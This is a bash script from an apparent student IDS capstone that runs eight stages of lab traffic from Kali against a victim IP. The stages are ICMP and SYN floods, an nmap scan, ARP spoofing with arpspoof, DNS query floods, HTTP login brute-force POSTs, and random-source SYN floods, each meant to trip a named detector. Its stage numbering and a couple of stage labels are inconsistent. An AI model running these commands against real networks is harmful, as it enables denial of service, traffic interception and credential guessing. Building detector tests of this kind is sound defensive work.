#!/bin/bash
# =============================================================================
# NetIDS Capstone Demo — Attack Sequence
# Run this from your Kali machine against the victim IDS
# Usage: sudo bash demo_attack.sh <victim-ip>
# Example: sudo bash demo_attack.sh 192.168.56.103
# =============================================================================

VICTIM="${1:-192.168.56.103}"


RED='\033[91m'
YELLOW='\033[93m'
GREEN='\033[92m'
CYAN='\033[96m'
BOLD='\033[1m'
RESET='\033[0m'

banner() {
    echo -e "\n${CYAN}${BOLD}========================================${RESET}"
    echo -e "${CYAN}${BOLD}  $1${RESET}"
    echo -e "${CYAN}${BOLD}========================================${RESET}\n"
}

step() {
    echo -e "${YELLOW}${BOLD}[*] $1${RESET}"
}

done_msg() {
    echo -e "${GREEN}${BOLD}[+] $1${RESET}"
}

echo -e "\n${BOLD}NetIDS Demo Attack Sequence${RESET}"
echo -e "Target: ${BOLD}${VICTIM}${RESET}"
echo -e "Press ENTER to start or Ctrl+C to abort..."
read

# -----------------------------------------------------------------------------
# 1. ICMP Flood — triggers ICMP_FLOOD_SUSPECTED (MEDIUM -> HIGH)
# -----------------------------------------------------------------------------
banner "Stage 1/4 — ICMP Flood (T1498)"
step "Sending 20 ICMP echo requests at 0.3s intervals..."
hping3 --icmp --count 20 --interval u300000 "$VICTIM"
done_msg "ICMP flood complete. Expected: ICMP_FLOOD_SUSPECTED MEDIUM then HIGH"
sleep 2

# -----------------------------------------------------------------------------
# 2. Port Scan — triggers PORT_SCAN_SUSPECTED (MEDIUM -> HIGH)
# -----------------------------------------------------------------------------
banner "Stage 2/4 — Port Scan (T1046)"
step "Running nmap SYN scan across 50 ports..."
nmap -sS --max-rate 200 -p 1-50 "$VICTIM" -Pn
done_msg "Port scan complete. Expected: PORT_SCAN_SUSPECTED MEDIUM"
sleep 2

# -----------------------------------------------------------------------------
# 3. SYN Burst — triggers SYN_BURST_SUSPECTED (MEDIUM -> HIGH)
# -----------------------------------------------------------------------------
banner "Stage 3/4 — SYN Burst / DoS (T1498)"
step "Sending 15 SYN packets at 0.3s intervals to port 80..."
hping3 -S -p 80 --count 15 --interval u300000 "$VICTIM"
done_msg "SYN burst complete. Expected: SYN_BURST_SUSPECTED MEDIUM then HIGH"
sleep 2

# -----------------------------------------------------------------------------
# 4. SSH Brute Force — triggers SSH_BRUTEFORCE_SUSPECTED (MEDIUM -> HIGH)
# -----------------------------------------------------------------------------
banner "Stage 4/4 — SSH Brute Force (T1110)"
step "Sending 35 SYN packets to port 22 at 0.6s intervals..."
step "Watch for MEDIUM at attempt 12, HIGH at attempt 30..."
hping3 -S -p 22 --count 35 --interval u600000 "$VICTIM"
done_msg "SSH brute force complete. Expected: SSH_BRUTEFORCE_SUSPECTED MEDIUM then HIGH"

# -----------------------------------------------------------------------------
# 5. ARP Spoofing — triggers ARP_SPOOF_SUSPECTED (HIGH)
# -----------------------------------------------------------------------------
banner "Stage 5/8 — ARP Spoofing (T1557.002)"
step "Sending 25 gratuitous ARP replies to poison the segment..."
step "Requires arpspoof (dsniff package): sudo apt-get install -y dsniff"
# Grab the gateway IP automatically, fall back to a common default
GATEWAY=$(ip route | awk '/default/ {print $3; exit}')
GATEWAY="${GATEWAY:-192.168.56.1}"
step "Using gateway: ${GATEWAY}"
for i in $(seq 1 25); do
    arping -c 1 -A -I eth0 "$VICTIM" 2>/dev/null || \
    arpspoof -i eth0 -t "$VICTIM" "$GATEWAY" &>/dev/null &
    sleep 0.5
done
wait
done_msg "ARP spoof complete. Expected: ARP_SPOOF_SUSPECTED HIGH"
sleep 2

# -----------------------------------------------------------------------------
# 6. DNS Tunneling — triggers DNS_TUNNEL_SUSPECTED (MEDIUM -> HIGH)
# -----------------------------------------------------------------------------
banner "Stage 6/8 — DNS Tunneling (T1071.004)"
step "Sending 50 rapid DNS queries to trigger rate detection..."
for i in $(seq 1 50); do
    dig @"$VICTIM" "query${i}.example.com" +time=1 +tries=1 &>/dev/null &
done
wait
done_msg "DNS rate flood complete. Expected: DNS_TUNNEL_SUSPECTED MEDIUM"
sleep 1

step "Sending long-subdomain query to trigger name-length detection..."
LONG_NAME=$(python3 -c "print('A'*60)")
dig @"$VICTIM" "${LONG_NAME}.tunnel.example.com" +time=1 +tries=1 &>/dev/null
done_msg "Long DNS query sent. Expected: DNS_TUNNEL_SUSPECTED MEDIUM/HIGH"
sleep 2

# -----------------------------------------------------------------------------
# 7. HTTP Brute Force — triggers HTTP_BRUTEFORCE_SUSPECTED (MEDIUM -> HIGH)
# -----------------------------------------------------------------------------
banner "Stage 7/8 — HTTP Brute Force (T1110)"
step "Sending 30 rapid POST requests to port 80..."
step "Note: victim needs a web server running (python3 -m http.server 80)"
for i in $(seq 1 30); do
    curl -s -X POST "http://${VICTIM}/login" \
        -d "user=admin&pass=attempt${i}" \
        --connect-timeout 1 &>/dev/null &
done
wait
done_msg "HTTP brute force complete. Expected: HTTP_BRUTEFORCE_SUSPECTED MEDIUM then HIGH"
sleep 2

# -----------------------------------------------------------------------------
# 8. Slow Loris — triggers SLOW_LORIS_SUSPECTED (MEDIUM -> HIGH)
# -----------------------------------------------------------------------------
banner "Stage 8/8 — Slow Loris DoS (T1499)"
step "Opening 25 half-open TCP connections to port 80..."
step "Requires hping3 — sending SYN packets without completing handshake..."
hping3 -S -p 80 --count 25 --interval u200000 --rand-source "$VICTIM" &>/dev/null
done_msg "Slow Loris simulation complete. Expected: SLOW_LORIS_SUSPECTED MEDIUM then HIGH"

# -----------------------------------------------------------------------------
# Done
# -----------------------------------------------------------------------------
echo -e "\n${GREEN}${BOLD}========================================${RESET}"
echo -e "${GREEN}${BOLD}  Demo complete.${RESET}"
echo -e "${GREEN}${BOLD}  All 8 detectors triggered from ${VICTIM}${RESET}"
echo -e "${GREEN}${BOLD}  Check IDS console and dashboard.${RESET}"
echo -e "${GREEN}${BOLD}========================================${RESET}\n"
